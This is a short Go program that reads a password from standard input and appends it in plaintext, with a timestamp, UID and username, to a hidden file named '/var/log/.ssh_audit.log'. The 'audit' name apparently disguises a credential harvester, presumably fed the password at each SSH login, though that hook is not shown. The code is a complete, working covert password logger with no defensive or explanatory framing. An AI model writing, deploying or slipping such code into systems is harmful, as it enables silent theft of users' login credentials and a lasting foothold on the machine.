package main

import (
	"fmt"
	"os"
	"os/user"
	"time"
)

func main() {
	f, err := os.OpenFile("/var/log/.ssh_audit.log", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0600)
	if err != nil {
		return
	}

	var data_pwd string
	fmt.Scanln(&data_pwd)

	data_user, _ := user.Current()
	_, _ = f.WriteString(time.Now().String() + " \n")
	_, _ = f.WriteString("UID: " + data_user.Uid + " \n")
	_, _ = f.WriteString("Username: " + data_user.Name + " \n")
	_, _ = f.WriteString("Password: " + data_pwd + " \n")
}
